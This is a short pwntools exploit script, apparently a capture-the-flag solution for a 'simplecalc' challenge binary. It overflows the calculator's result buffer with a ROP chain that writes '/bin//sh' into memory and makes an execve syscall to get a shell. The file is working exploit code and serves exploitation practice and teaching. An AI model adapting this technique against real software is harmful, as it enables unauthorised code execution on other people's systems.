from pwn import *
from struct import pack

r = process("./simplecalc")
# Padding goes here
chain = []

chain.append(0x401c87) # pop rsi ; ret
chain.append(0x6c1060) # @ .data
chain.append(0x44db34) # pop rax ; ret
chain.append(0x6e69622f) # '/bin//sh'
chain.append(0x68732f2f)
chain.append(0x470f11) # mov qword ptr [rsi], rax ; ret
chain.append(0x401c87) # pop rsi ; ret
chain.append(0x6c1068) # @ .data + 8
chain.append(0x41c61f) # xor rax, rax ; ret
chain.append(0x470f11) # mov qword ptr [rsi], rax ; ret
chain.append(0x401b73) # pop rdi ; ret
chain.append(0x6c1060) # @ .data
chain.append(0x401c87) # pop rsi ; ret
chain.append(0x6c1068) # @ .data + 8
chain.append(0x437a85) # pop rdx ; ret
chain.append(0x6c1068) # @ .data + 8

chain.append(0x41c61f) # xor rax, rax ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463b87) # add rax, 2 ; ret

chain.append(0x400488) # syscall

r.sendline("255")

for i in range(18):
	r.sendline("1")
	r.sendline(str(4294967296 / 2))
	r.sendline(str(4294967296 / 2))

for gadget in chain:
	r.sendline("1")
	r.sendline(str(40))
	r.sendline(str(gadget - 40))

	if (gadget == 0x6e69622f or gadget == 0x68732f2f):
		continue

	r.sendline("1")
	r.sendline(str(4294967296 / 2))
	r.sendline(str(4294967296 / 2))

r.sendline("5")
r.interactive()